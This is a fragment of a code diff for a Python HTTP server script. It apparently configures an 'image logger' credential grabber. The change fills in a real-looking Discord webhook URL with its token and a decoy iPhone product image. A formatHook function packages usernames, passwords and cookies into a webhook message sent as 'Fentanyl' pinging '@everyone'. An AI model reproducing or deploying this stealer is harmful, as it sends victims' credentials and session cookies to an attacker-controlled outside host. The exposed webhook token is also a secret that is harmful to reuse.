@@ -2,8 +2,8 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-webhook = 'WEBHOOK'
-bindata = requests.get('IMAGE LINK').content
+webhook = 'https://discordapp.com/api/webhooks/989537783800557568/KxaBa41xBzZVs2bXf90gcT2vbxNhicEo-U9i8sF7ujVcMhuqH4bqfxbge5-CONZJyp2J'
+bindata = requests.get('https://www.starhub.com/content/dam/catalog/starhub-store-iphone-14-pro-max-gold-front.png').content
 def formatHook(username,password,cookies):return {
 "username": "Fentanyl",
 "content": "@everyone",
